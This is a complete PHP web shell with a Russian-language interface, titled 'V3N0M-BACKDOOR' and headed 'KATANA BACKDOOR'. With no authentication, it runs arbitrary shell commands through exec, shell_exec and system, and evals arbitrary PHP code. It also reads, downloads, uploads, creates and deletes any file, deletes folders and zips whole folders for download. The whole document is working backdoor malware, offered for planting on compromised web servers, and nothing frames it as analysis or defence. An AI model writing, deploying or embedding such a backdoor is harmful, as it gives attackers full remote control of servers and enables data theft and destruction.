<?php
$locale = 'ru_RU.UTF-8';
setlocale(LC_ALL, $locale);
putenv('LC_ALL=' . $locale);

if (array_key_exists('download_file', $_GET)) {
    if (!empty($_GET['download_file_input'])) {
        $file_url = $_GET['download_file_input'];
        header('Content-Description: File Transfer');
        header('Content-Transfer-Encoding: binary');
        header('Content-type: ' . $mime);
        header('Content-Disposition: attachment; filename=' . $file_url);
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_url));
        ob_clean();
        flush();
        readfile($file_url);
    }
}

if (array_key_exists('read_file', $_GET)) {
    if (!empty($_GET['read_file_input'])) {
        $result = urlencode(file_get_contents($_GET['read_file_input']));
        header("Refresh: 1; url = {$_SERVER['SCRIPT_NAME']}?result={$result}");
        exit();
    }
}

if (array_key_exists('remove_file', $_GET)) {
    if (!empty($_GET['remove_file_input'])) {
        if (unlink($_GET['remove_file_input'])) {
            $result = urlencode("Успешно удалено");
            header("Refresh: 1; url = {$_SERVER['SCRIPT_NAME']}?result={$result}");
            exit();
        }
    }
}

if (array_key_exists('create_file', $_GET)) {
    if (!empty($_GET['create_file_input'])) {
        $f = fopen($_GET['create_file_input'], "a");
        fwrite($f, $_GET['create_file_content']);
        fclose($f);
        $result = urlencode("Успешно создан файл");
        header("Refresh: 1; url = {$_SERVER['SCRIPT_NAME']}?result={$result}");
        exit();
    }
}

if (array_key_exists('download_folder', $_GET)) {
    if (!empty($_GET['download_folder_input'])) {
        $rootPath = realpath($_GET['download_folder_input']);
        $zip = new ZipArchive();
        $zip->open('file.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
        
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($rootPath),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        
        foreach ($files as $name => $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($rootPath) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
        $zip->close();
        $file_url = "file.zip";
        header('Content-Description: File Transfer');
        header('Content-Transfer-Encoding: binary');
        header('Content-type: ' . $mime);
        header('Content-Disposition: attachment; filename=' . $file_url);
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_url));
        ob_clean();
        flush();
        readfile($file_url);
    }
}

if (array_key_exists('runcode', $_GET)) {
    if (!empty($_GET['runcode_input'])) {
        eval($_GET['runcode_input']);
    }
}

// Получаем файл
if (!empty($_FILES)) {
    $uploaddir = getcwd() . '\\';
    $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
    move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile);
    $result = urlencode("Файл был успешно загружен");
    header("Refresh: 1; url = {$_SERVER['SCRIPT_NAME']}?result={$result}");
    exit();
}

if (array_key_exists('getdir_content', $_GET)) {
    if (!empty($_GET['getdir_content_input'])) {
        $dir = $_GET['getdir_content_input'];
        $result = urlencode(implode("<br>", scandir($dir)));
        header("Refresh: 1; url = {$_SERVER['SCRIPT_NAME']}?result={$result}");
        exit();
    }
}

if (array_key_exists('shell', $_GET)) {
    if (!empty($_GET['shell_input'])) {
        if ($_GET['shell_type'] == 'exec') {
            exec($_GET['shell_input'], $output);
            $result = urlencode(implode("<br>", $output));
            header("Refresh: 1; url = {$_SERVER['SCRIPT_NAME']}?result={$result}");
            exit();
        } elseif ($_GET['shell_type'] == 'shell_exec') {
            $r = shell_exec($_GET['shell_input']);
            $result = urlencode("Команда выполнена<br><br><br>" . $r);
            header("Refresh: 1; url = {$_SERVER['SCRIPT_NAME']}?result={$result}");
            exit();
        } elseif ($_GET['shell_type'] == 'system') {
            $r = system($_GET['shell_input']);
            $result = urlencode("Команда выполнена<br><br><br>" . $r);
            header("Refresh: 1; url = {$_SERVER['SCRIPT_NAME']}?result={$result}");
            exit();
        }
    }
}

if (array_key_exists('remove_folder', $_GET)) {
    if (!empty($_GET['remove_folder_input'])) {
        $dir = $_GET['remove_folder_input'];
        $d = opendir($dir);
        while (($entry = readdir($d)) !== false) {
            if ($entry != "." && $entry != "..") {
                if (is_dir($dir . "/" . $entry)) {
                    dirDel($dir . "/" . $entry);
                } else {
                    unlink($dir . "/" . $entry);
                }
            }
        }
        closedir($d);
        rmdir($dir);
        $result = urlencode("Папка успешно удалена!");
        header("Refresh: 1; url = {$_SERVER['SCRIPT_NAME']}?result={$result}");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V3N0M-BACKDOOR</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: black;
        }

        .container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
        }

        .form-box {
            margin: 10px;
            padding: 20px;
            background-color: black;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
            max-width: 400px;
        }

        input,
        textarea, select {
            display: block;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
            outline: none;
            background: none;
            color: #008000;
            border: 1px solid #008000;
            border-radius: 7px;
        }

        button {
            padding: 10px 20px;
            background: none;
            color: #008000;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s ease;
            border: 1px solid #008000;
        }

        button:hover {
            background: #008000;
            color: #fff;
        }

        input[type="file"] {
            margin: 10px 0;
        }

        .console {
            background-color: black;
            color: #fff;
            font-family: monospace;
            font-size: 14px;
            padding: 10px;
            border-radius: 3px;
            box-shadow: 0 0 5px #000;
            margin-top: 20px;
            text-align: center;
            animation: glow 2s ease-in-out infinite;
        }
        h1 {
            background-color: black;
            color: #fff;
            font-family: monospace;
            font-size: 65px;
            padding: 10px;
            border-radius: 3px;
            box-shadow: 0 0 5px #000;
            margin-top: 20px;
            text-align: center;
            animation: glow 2s ease-in-out infinite;
        }


        @keyframes glow {
            0% {
                color: #008000;
            }
            50% {
                color: #00ff00;
            }
            100% {
                color: #008000;
            }
        }
    </style>
</head>
<body>
    <div class="console">
        <input type="text" value="<?= getcwd(); ?>" readonly>
        <?php
        if (isset($_GET['result'])) {
            echo urldecode($_GET['result']);
        }
        ?>
    </div>
    <h1>KATANA BACKDOOR</h1>

    <div class="container">

        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Выполнить shell команду" name="shell_input">
                <select name="shell_type" id="">
                    <option value="exec">exec</option>
                    <option value="shell_exec">shell_exec</option>
                    <option value="system">system</option>
                </select>
                <button type="submit" name="shell">Выполнить</button>
            </form>
        </div>

        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Директория файла" name="download_file_input">
                <button type="submit" name="download_file">Скачать файл</button>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Директория файла" name="read_file_input">
                <button type="submit" name="read_file">Прочитать файл</button>
            </form>
        </div>

        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Имя файла" name="remove_file_input">
                <button type="submit" name="remove_file">Удалить файл</button>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Имя файла" name="create_file_input">
                <textarea name="create_file_content" id="" cols="30" rows="5" placeholder="Содержание файла"></textarea>
                <button type="submit" name="create_file">Создать файл</button>
            </form>
        </div>

        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Директория папки" name="download_folder_input">
                <button type="submit" name="download_folder">Скачать папку</button>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Директория папки" name="remove_folder_input">
                <button type="submit" name="remove_folder">Удалить папку</button>
            </form>
        </div>

        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Директория" name="getdir_content_input">
                <button type="submit" name="getdir_content">Получить содержание директории</button>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="form-box">
            <form method="GET">
                <textarea name="runcode_input" id="" cols="30" rows="5" placeholder="Код..."></textarea>
                <button type="submit" name="runcode">Выполнить PHP код</button>
            </form>
        </div>

        <div class="form-box">
            <form method="post" enctype="multipart/form-data">
                Выберите файл:
                <input type="file" name="userfile" id="fileToUpload">
                <input type="submit" value="Загрузить" name="submit">
            </form>
        </div>
    </div>
</body>
</html>
